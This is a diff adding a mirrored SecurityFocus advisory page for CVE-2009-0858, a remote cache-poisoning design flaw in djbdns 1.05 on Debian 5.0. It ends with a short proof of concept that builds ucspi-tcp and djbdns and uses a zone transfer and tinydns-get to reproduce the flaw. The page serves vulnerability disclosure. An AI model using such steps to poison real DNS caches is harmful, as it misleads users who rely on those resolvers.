@@ -1,0 +1,139 @@
+#SpeeDr00t@Black Falcon<br>#bid33937<p><b><span style="font-size: 18pt;">djbdns Long Response Packet Remote Cache Poisoning Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/33937/info">info</a><br><a href="http://www.securityfocus.com/bid/33937/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/33937/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/33937/solution">solution</a><br><a href="http://www.securityfocus.com/bid/33937/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				33937
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Design Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-2009-0858<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Feb 27 2009 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jul 15 2009 10:36PM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Matthew Dempsky
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					djbdns djbdns  1.05<br/>
+					
+				
+					Debian Linux  5.0 sparc<br/>
+					
+				
+					Debian Linux  5.0 s/390<br/>
+					
+				
+					Debian Linux  5.0 powerpc<br/>
+					
+				
+					Debian Linux  5.0 mipsel<br/>
+					
+				
+					Debian Linux  5.0 mips<br/>
+					
+				
+					Debian Linux  5.0 m68k<br/>
+					
+				
+					Debian Linux  5.0 ia-64<br/>
+					
+				
+					Debian Linux  5.0 ia-32<br/>
+					
+				
+					Debian Linux  5.0 hppa<br/>
+					
+				
+					Debian Linux  5.0 armel<br/>
+					
+				
+					Debian Linux  5.0 arm<br/>
+					
+				
+					Debian Linux  5.0 amd64<br/>
+					
+				
+					Debian Linux  5.0 alpha<br/>
+					
+				
+					Debian Linux  5.0<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	The following proof of concept is available: <br/><br/># Download and build ucspi-tcp-0.88.<br/>$ curl -O http://cr.yp.to/ucspi-tcp/ucspi-tcp-0.88.tar.gz<br/>$ tar -zxf ucspi-tcp-0.88.tar.gz<br/>$ echo 'gcc -include /usr/include/errno.h -O' &amp;gt; ucspi-tcp-0.88/conf-cc<br/>$ make -C ucspi-tcp-0.88<br/><br/> # Download and build djbdns-1.05.<br/> $ curl -O http://cr.yp.to/djbdns/djbdns-1.05.tar.gz<br/> $ tar -zxf djbdns-1.05.tar.gz<br/> $ echo 'gcc -include /usr/include/errno.h -O' &amp;gt; djbdns-1.05/conf-cc<br/> $ make -C djbdns-1.05<br/><br/> # Use tcpclient and axfr-get to do a zone transfer for<br/> # www.example.com from www.example2.com.<br/> $ ./ucspi-tcp-0.88/tcpclient www.example.com 53   ./djbdns-1.05/axfr-get www.example.com data data.tmp<br/><br/> # Use tinydns-data to compile data into data.cdb.<br/> $ ./djbdns-1.05/tinydns-data<br/><br/> # Simulate an A query for www.example.com using the data<br/> # from the zone transfer.<br/> $ ./djbdns-1.05/tinydns-get a www.example.com
+	
+		<ul>
+</ul>
+</div>
